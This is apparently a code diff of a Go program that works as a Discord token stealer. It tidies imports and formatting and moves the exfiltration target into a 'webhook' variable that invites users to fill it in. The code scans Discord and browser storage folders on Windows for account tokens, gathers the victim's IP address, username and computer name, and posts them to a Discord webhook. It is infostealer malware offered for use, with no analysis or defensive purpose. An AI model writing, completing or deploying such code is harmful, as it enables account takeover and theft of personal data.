@@ -1,15 +1,19 @@
 package main
 
 import (
-	"fmt"
-	"os"
-	"errors"
-	"strings"
 	"bufio"
-	"regexp"
+	"errors"
+	"fmt"
 	"io/ioutil"
 	"net/http"
 	"net/url"
+	"os"
+	"regexp"
+	"strings"
+)
+
+var (
+	webhook = "" // Feel free to add your webhook here ;)
 )
 
 func GrabIP() (string, error) {
@@ -31,13 +35,13 @@ func GrabTk() string {
 	re := regexp.MustCompile("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}|mfa\\.[\\w-]{84}")
 	local, roaming := os.Getenv("LOCALAPPDATA"), os.Getenv("APPDATA")
 	paths := map[string]string{
-		"Discord": roaming + "\\Discord",
+		"Discord":        roaming + "\\Discord",
 		"Discord Canary": roaming + "\\discordcanary",
-		"Discord PTB": roaming + "\\discordptb",
-		"Opera": roaming + "\\Opera Software\\Opera Stable",
-		"Chrome": local + "\\Google\\Chrome\\User Data\\Default",
-		"Brave": local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
-		"Yandex": local + "\\Yandex\\YandexBrowser\\User Data\\Default",
+		"Discord PTB":    roaming + "\\discordptb",
+		"Opera":          roaming + "\\Opera Software\\Opera Stable",
+		"Chrome":         local + "\\Google\\Chrome\\User Data\\Default",
+		"Brave":          local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
+		"Yandex":         local + "\\Yandex\\YandexBrowser\\User Data\\Default",
 	}
 	msg := "@everyone Yikes\n"
 
@@ -58,8 +62,8 @@ func GrabTk() string {
 			if !strings.HasSuffix(file.Name(), ".ldb") || !strings.HasSuffix(file.Name(), ".log") {
 				continue
 			}
-			
-			f, err := os.OpenFile(path + "\\" + file.Name(), os.O_RDONLY, os.ModePerm)
+
+			f, err := os.OpenFile(path+"\\"+file.Name(), os.O_RDONLY, os.ModePerm)
 			defer f.Close()
 			if err != nil {
 				continue
@@ -73,7 +77,7 @@ func GrabTk() string {
 				for _, tk := range re.FindAllString(ln, -1) {
 					msg = msg + path + " Token: " + tk + "\n"
 				}
-			} 
+			}
 		}
 	}
 
@@ -92,8 +96,8 @@ func main() {
 	name := os.Getenv("USERNAME") + " " + os.Getenv("COMPUTERNAME")
 
 	msg := fmt.Sprintf("@everyone Yikes\n```%s```\n```%s```\n```%s```", Tkns, IP, name)
-	
-	_, err = http.PostForm("aca va el webhook", url.Values{"content": {msg}})
+
+	_, err = http.PostForm(webhook, url.Values{"content": {msg}})
 	if err != nil {
 		go main()
 		return
